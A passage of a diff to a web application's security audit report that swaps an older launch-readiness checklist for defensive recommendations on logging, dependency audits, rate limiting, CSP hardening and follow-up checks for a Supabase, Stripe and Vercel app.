+- HSTS sent in production; ensure custom domains preload after verifying readiness.
 
-**Day 3-4:**
-4. Portal rate limiting (2 hours)
-5. File type validation (1 hour)
-6. Stripe validation (1 hour)
+### 8. Logging & Error Handling
+- Logger redacts sensitive keys, but raw Supabase errors (including table names) are sometimes returned to clients. Wrap with user-friendly messages and log details server-side only.
+- Audit hosted logging/monitoring permissions to prevent unauthorized access to logs.
 
-**Day 5:**
-7. Password requirements (2 hours)
-8. UUID validation helper (2 hours)
+### 9. Dependencies & Packages
+- `npm audit` could not complete because network access is blocked in this environment. Run `npm audit --production` locally or in CI, then `npm audit fix` where safe.
+- Ensure `node`/`npm` versions in production receive LTS security updates.
 
-### Week 2 (Post-Launch)
-- Address MEDIUM priority items
-- Security testing
-- Penetration testing if budget allows
-
----
-
-## 🎯 LAUNCH READINESS STATUS
-
-### ❌ NOT READY FOR LAUNCH
-**Reason:** 3 CRITICAL and 5 HIGH priority security issues must be fixed first.
-
-### ✅ WILL BE READY AFTER:
-1. All CRITICAL issues fixed
-2. All HIGH issues fixed
-3. Security testing completed
-4. This report reviewed with team
-
-**Estimated Time to Launch Ready:** 2-3 days of focused work
+### 10. Rate Limiting & DDoS
+- Current in-memory limiter is vulnerable to horizontal scaling bypass. Introduce a hosted store (Redis, Upstash, Vercel KV) and stricter limits on expensive endpoints (AI, uploads).
+- Implement account lockout or exponential backoff on authentication routes to mitigate brute force.
 
 ---
 
-## 📞 SUPPORT & RESOURCES
-
-### Security Tools to Integrate
-1. **Snyk** - Continuous dependency scanning
-2. **OWASP ZAP** - Automated security testing
-3. **Vercel Security** - Edge protection
-4. **Sentry** - Error monitoring (already integrated ✅)
-
-### Security Contacts
-- **Supabase Support:** For RLS policy questions
-- **Stripe Support:** For payment security
-- **Vercel Support:** For infrastructure security
+## Recommended Next Steps
+1. **Blocker fixes:** Ship tenant-ownership checks and switch to token-bound Supabase clients for every customer-facing API handler.
+2. **Secrets:** Enforce presence of `CSRF_SECRET_KEY`; rotate to a cryptographically strong value.
+3. **Validation:** Introduce shared zod schemas for calendar/project payloads and enforce them in handlers.
+4. **Rate limiting:** Move counters to a durable store and tighten AI/upload quotas.
+5. **CSP hardening:** Plan to migrate to nonce-based scripts and remove `unsafe-*` directives after the immediate launch crunch.
+6. **Dependency scan:** Re-run `npm audit` with network access and apply patches.
 
 ---
 
-## 📝 FINAL RECOMMENDATIONS
-
-### Immediate Actions (Today):
-1. Run: `npm install next@15.5.4`
-2. Add auth to upload-image route
-3. Fix innerHTML XSS issues
-4. Review and test changes
-
-### This Week:
-5. Implement all HIGH priority fixes
-6. Test authentication flows
-7. Validate all user inputs
-8. Security review with team
-
-### Post-Launch:
-9. Set up automated security scanning
-10. Regular dependency updates
-11. Quarterly security audits
-12. Bug bounty program (if budget allows)
+## Constraints & Follow-up Items
+- `npm audit --json` failed (`ENOTFOUND registry.npmjs.org`) because outbound networking is blocked in this workspace. Run the command locally or in CI and capture the report.
+- Database RLS settings, backup status, and Vercel environment variable configuration cannot be verified from code alone—perform manual checks in those dashboards.
+- After applying fixes, regression-test the portal, calendar UI, and integrations (LATE, Stripe) with least-privilege accounts to ensure no functionality regressed.
 
 ---
 
-## ✅ SIGN-OFF
-
-Once all CRITICAL and HIGH issues are resolved:
-- [ ] Security fixes tested
-- [ ] Code reviewed by second developer
-- [ ] Penetration testing completed (recommended)
-- [ ] Launch approval granted
-
-**Note:** This audit is comprehensive but not exhaustive. Consider professional penetration testing before handling sensitive data or processing payments at scale.
-
----
-
-**Audit Completed By:** AI Security Analyst  
-**Review Status:** COMPLETE  
-**Next Review:** 3 months post-launch
+## Appendix
+- `CRITICAL_FIXES.md` enumerates only the blockers for engineering focus.
+- `SECURITY_CHECKLIST.md` gives a step-by-step QA list for final verification.
 
